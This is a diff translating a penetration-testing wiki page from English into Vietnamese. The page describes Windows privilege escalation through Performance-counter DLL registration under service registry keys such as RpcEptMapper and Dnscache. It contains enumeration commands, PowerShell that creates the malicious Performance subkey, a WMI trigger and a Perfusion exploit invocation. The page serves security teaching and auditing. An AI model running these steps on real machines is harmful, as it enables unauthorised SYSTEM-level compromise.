@@ -1,20 +1,20 @@
-# AppendData/AddSubdirectory Permission over Service Registry
+# Quyền AppendData/AddSubdirectory trên Registry của dịch vụ
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>
+**Bài đăng gốc là** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>
 
-## Summary
+## Tóm tắt
 
-If you only have **`Create Subkey`** / **`AppendData/AddSubdirectory`** on a service registry key, this is still a good privesc lead. You usually **can't** overwrite `ImagePath`, `ServiceDll`, or other existing values directly, but you may still be able to create a **`Performance`** child key under:
+Nếu bạn chỉ có quyền **`Create Subkey`** / **`AppendData/AddSubdirectory`** trên một khóa registry của dịch vụ, đây vẫn là một manh mối tốt để privesc. Thông thường, bạn **không thể** ghi đè trực tiếp `ImagePath`, `ServiceDll` hoặc các value hiện có khác, nhưng vẫn có thể tạo một khóa con **`Performance`** bên dưới:
 
 - **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
 - **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
-- Any other **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key where your token has **`KEY_CREATE_SUB_KEY`**
+- Bất kỳ khóa **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** nào khác mà token của bạn có quyền **`KEY_CREATE_SUB_KEY`**
 
-The trick is that Windows still supports the legacy **PerfLib V1** registration model. If a service has a **`Performance`** subkey, Windows can load a DLL from there when a performance counter consumer requests data.
+Mấu chốt là Windows vẫn hỗ trợ mô hình đăng ký **PerfLib V1** cũ. Nếu dịch vụ có khóa con **`Performance`**, Windows có thể tải một DLL từ đó khi một consumer của performance counter yêu cầu dữ liệu.
 
-According to Microsoft documentation, the minimum registration is:<sup>[[1]](#references)</sup>
+Theo tài liệu của Microsoft, cấu hình đăng ký tối thiểu là:<sup>[[1]](#references)</sup>
 
 ```text
 HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
@@ -24,31 +24,31 @@ HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
   Close   = ClosePerfData
 ```
 
-So the offensive takeaway is: **don't discard a service registry finding just because you only got `CreateSubKey` instead of `SetValue`**.<sup>[[3]](#references)</sup>
+Vì vậy, bài học tấn công là: **đừng bỏ qua phát hiện về registry của service chỉ vì bạn chỉ có `CreateSubKey` thay vì `SetValue`**.<sup>[[3]](#references)</sup>
 
-## Why this is enough for code execution
+## Vì sao như vậy là đủ để thực thi mã
 
-The `Performance` subkey does **not** usually exist by default on these services, so **`KEY_CREATE_SUB_KEY`** is the primitive you need. Once the key exists and contains `Library`/`Open`/`Collect`/`Close`, any **performance counter consumer** can trigger the DLL load.<sup>[[3]](#references)</sup>
+Subkey `Performance` thường **không tồn tại mặc định** trên các service này, nên **`KEY_CREATE_SUB_KEY`** là primitive bạn cần. Sau khi key được tạo và chứa `Library`/`Open`/`Collect`/`Close`, bất kỳ **performance counter consumer** nào cũng có thể kích hoạt việc load DLL.<sup>[[3]](#references)</sup>
 
-A few important details:
+Một số chi tiết quan trọng:
 
-- The **`Library`** value can point to a **full DLL path**.
-- The DLL must export **`OpenPerfData`**, **`CollectPerfData`**, and **`ClosePerfData`** and return `ERROR_SUCCESS`.
-- The code runs in the **consumer's context**, **not necessarily in the vulnerable service process itself**.
-- In the classic `RpcEptMapper` / `Dnscache` case, a **WMI performance query** can make **`wmiprvse.exe`** load the DLL as **`NT AUTHORITY\SYSTEM`**.
+- Giá trị **`Library`** có thể trỏ đến **đường dẫn DLL đầy đủ**.
+- DLL phải export **`OpenPerfData`**, **`CollectPerfData`** và **`ClosePerfData`**, đồng thời trả về `ERROR_SUCCESS`.
+- Mã chạy trong **context của consumer**, **không nhất thiết trong chính tiến trình của service có lỗ hổng**.
+- Trong trường hợp kinh điển `RpcEptMapper` / `Dnscache`, một **truy vấn hiệu năng WMI** có thể khiến **`wmiprvse.exe`** load DLL với quyền **`NT AUTHORITY\SYSTEM`**.
 
-This is why the primitive is easy to miss during triage: the parent service key is not "fully writable", but it is still weaponizable.
+Đây là lý do primitive này dễ bị bỏ sót khi triage: key của service cha không "có toàn quyền ghi", nhưng vẫn có thể bị weaponize.
 
-## Quick enumeration
+## Liệt kê nhanh
 
-Manual spot-check with **AccessChk**:
+Kiểm tra thủ công bằng **AccessChk**:
 
 ```bash
 accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
 accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
 ```
 
-PowerShell example to look for low-privileged principals with **`CreateSubKey`** on service keys:
+Ví dụ PowerShell để tìm các principal có đặc quyền thấp được cấp quyền **`CreateSubKey`** trên các khóa dịch vụ:
 
 ```powershell
 Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
@@ -63,15 +63,15 @@ Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
 }
 ```
 
-Useful tooling:
+Công cụ hữu ích:
 
-- **PrivescCheck**: `Get-ModifiableRegistryPath` was created specifically to spot this class of issue.<sup>[[3]](#references)</sup>
+- **PrivescCheck**: `Get-ModifiableRegistryPath` được tạo riêng để phát hiện loại vấn đề này.<sup>[[3]](#references)</sup>
 - **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
-- **Perfusion**: automates DLL drop, `Performance` registration, WMI trigger, token duplication, and cleanup on legacy vulnerable targets (for example: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>
+- **Perfusion**: tự động hóa việc thả DLL, đăng ký `Performance`, kích hoạt WMI, sao chép token và dọn dẹp trên các mục tiêu cũ dễ bị tấn công (ví dụ: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>
 
-## Abuse flow
+## Quy trình khai thác
 
-Create the `Performance` subkey and populate the required values:<sup>[[3]](#references)</sup>
+Tạo khóa con `Performance` và điền các giá trị cần thiết:<sup>[[3]](#references)</sup>
 
 ```powershell
 $svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
@@ -83,37 +83,36 @@ New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String 
 New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
 ```
 
-Then trigger a **privileged** performance consumer. A classic example is a WMI query over `Win32_Perf*` classes:<sup>[[3]](#references)</sup>
+Sau đó kích hoạt một consumer hiệu năng **được cấp đặc quyền**. Ví dụ kinh điển là truy vấn WMI trên các lớp `Win32_Perf*`:<sup>[[3]](#references)</sup>
 
 ```powershell
 powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
 ```
 
-Operational notes:
+Ghi chú vận hành:
 
-- Launching **`perfmon.exe`** is useful to verify that the counter registration is correct, but that usually only loads the DLL in **your own user context**.
-- For an actual LPE, trigger a **privileged** consumer such as **WMI**.
-- If you are writing your own exploit, spawning `cmd.exe` directly from inside the DLL usually leaves you with a shell in **session 0**. `Perfusion` solves this by duplicating the privileged token into a process that was created suspended in the attacker's session.<sup>[[4]](#references)</sup>
-- Match the DLL architecture to the target consumer (**x64 on x64 systems**).
+- Khởi chạy **`perfmon.exe`** hữu ích để xác minh rằng việc đăng ký counter là chính xác, nhưng thường chỉ tải DLL trong **ngữ cảnh người dùng của chính bạn**.
+- Để thực hiện LPE thực sự, hãy kích hoạt một consumer có đặc quyền như **WMI**.
+- Nếu tự viết exploit, việc khởi chạy trực tiếp `cmd.exe` bên trong DLL thường khiến bạn có shell trong **session 0**. `Perfusion` xử lý việc này bằng cách nhân bản token có đặc quyền vào một process được tạo ở trạng thái suspended trong session của attacker.<sup>[[4]](#references)</sup>
+- Chọn kiến trúc DLL khớp với consumer mục tiêu (**x64 trên hệ thống x64**).
 
-## Version notes / recent developments
+## Ghi chú về phiên bản / diễn biến gần đây
 
-Historically, the built-in weak keys were:<sup>[[4]](#references)</sup>
+Trong lịch sử, các weak key có sẵn là:<sup>[[4]](#references)</sup>
 
-- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` and `Dnscache`
+- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` và `Dnscache`
 - **Windows 8 / Windows Server 2012**: `RpcEptMapper`
 
-`Perfusion` notes that the **April 2021** updates removed the easy exploitation path on updated **Windows 8 / Windows Server 2012**, while **Windows 7 / Windows Server 2008 R2** remained exploitable through **`Dnscache`**.<sup>[[4]](#references)</sup>
+`Perfusion` ghi nhận rằng các bản cập nhật **tháng 4 năm 2021** đã loại bỏ con đường khai thác dễ dàng trên **Windows 8 / Windows Server 2012** đã được cập nhật, trong khi **Windows 7 / Windows Server 2008 R2** vẫn có thể bị khai thác thông qua **`Dnscache`**.<sup>[[4]](#references)</sup>
 
-This primitive is **not only historical**. In **January 2025**, Microsoft patched a related AD DS issue where members of **`Network Configuration Operators`** could create subkeys under **`Dnscache`** and **`NetBT`**, and the same **Performance-counter DLL registration** idea could be reused to reach **SYSTEM** on supported systems.<sup>[[2]](#references)</sup>
+Primitive này **không chỉ thuộc về lịch sử**. Vào **tháng 1 năm 2025**, Microsoft đã vá một vấn đề AD DS liên quan, trong đó các thành viên của **`Network Configuration Operators`** có thể tạo subkey bên dưới **`Dnscache`** và **`NetBT`**; ý tưởng **đăng ký DLL qua Performance counter** tương tự có thể được tái sử dụng để đạt quyền **SYSTEM** trên các hệ thống được hỗ trợ.<sup>[[2]](#references)</sup>
 
-So the modern lesson is generic: whenever a low-privileged principal has **`CreateSubKey`** on **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, check whether a **`Performance`** child key is enough before dismissing the finding.
+Vì vậy, bài học hiện đại mang tính tổng quát là: bất cứ khi nào một principal có đặc quyền thấp có quyền **`CreateSubKey`** trên **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, hãy kiểm tra xem chỉ cần một khóa con **`Performance`** có đủ hay không trước khi bỏ qua phát hiện này.
 
 ## References
 
-- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
-- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
-- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
-- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)
-
+- [1] [Microsoft Learn - Tạo khóa Performance của ứng dụng](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
+- [2] [BirkeP - Lỗ hổng nâng cao đặc quyền trong Active Directory Domain Services (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
+- [3] [itm4n - EoP do quyền Registry không an toàn của dịch vụ Windows RpcEptMapper](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
+- [4] [itm4n - Perfusion (exploit cho lỗ hổng quyền của khóa Registry RpcEptMapper)](https://github.com/itm4n/Perfusion)
 {{#include ../../banners/hacktricks-training.md}}
